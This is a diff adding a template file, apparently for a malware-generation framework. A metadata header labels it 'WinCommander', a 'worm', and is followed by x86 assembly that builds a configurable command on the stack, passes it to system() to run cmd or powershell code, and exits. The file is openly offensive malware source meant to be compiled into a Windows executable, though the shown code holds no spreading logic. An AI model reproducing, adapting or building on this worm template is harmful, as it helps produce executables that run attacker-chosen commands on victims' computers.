@@ -1,0 +1,31 @@
+#!name##WinCommander
+#!types##worm
+#!info##A simple worm written in assembler x86. Executes a command, such as: 'cmd', 'powershell'. The code is placed on the stack, it has no '.data' section.
+#!reqVar##WC_command##Command to execute. Ex: 'cmd.exe dir', 'powershell.exe <code>' etc.##str##STACK_BUILD:True
+#!lang##asm
+#!banned##module##starter##shadow##junk
+#!system_FLAG##[W]
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!processWorm##BasicAsm
+#!reqVar##GLOBAL_COMPILER_NO_DLL##Whether the compiler should include libraries in the executable. Without the included DLLs, the resulting file takes up very little space.##str
+#!setVar##GLOBAL_COMPILER_NO_DLL##True##str
+
+
+global _main
+
+extern _ExitProcess@4
+extern _system
+
+section .text
+
+    _main:
+
+    push dword 0x00000000
+    {{WC_command}}
+
+    push esp
+    call _system
+
+    push 0
+    call _ExitProcess@4
